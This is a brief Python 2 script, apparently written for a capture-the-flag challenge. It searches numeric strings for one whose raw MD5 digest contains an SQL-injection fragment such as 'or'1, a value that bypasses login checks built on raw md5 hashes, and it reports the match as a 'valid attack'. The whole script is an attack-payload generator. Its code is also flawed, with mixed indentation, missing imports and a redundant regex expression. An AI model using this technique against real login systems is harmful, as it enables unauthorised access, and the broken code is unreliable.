


# need to find a single quote, one or more spaces, then "or" || "OR" || "oR" || "Or"
# and one or more spaces


i = 129581926211651571912466741651878680000

regex = ".*'((or)|([|][|]))'[1-9]" or ".*'((or)|([|][|]))'[1-9]"

time_elapsed = 0
while (1 == 1):
	if(i % 1000000 == 0):
		print "i now is = " + str(i)
	randStr = str(i)


    m = hashlib.md5()
	m.update(randStr)

	# print randStr
	# calc md5 hash
	# md5hash = getmd5(randStr)
	# is this a valid attack ?
	i = i + 1
	# print md5hash

    if re.search(regex, str(m.digest()), re.I ):
		print "Passward:" + randStr
		break


print "found valid attack"
print randStr
